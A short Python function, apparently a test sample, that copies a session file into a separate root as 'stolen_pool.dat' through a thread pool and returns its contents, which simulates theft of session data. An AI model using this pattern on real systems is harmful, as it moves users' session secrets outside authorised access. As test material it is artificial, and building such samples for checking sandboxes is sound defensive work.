from concurrent.futures import ThreadPoolExecutor
import shutil, os
def run(ctx):
    dest = os.path.join(ctx["roots"][2], "stolen_pool.dat")
    with ThreadPoolExecutor(max_workers=1) as ex:
        ex.submit(shutil.copyfile, ctx["session"], dest).result()
    return open(dest).read()
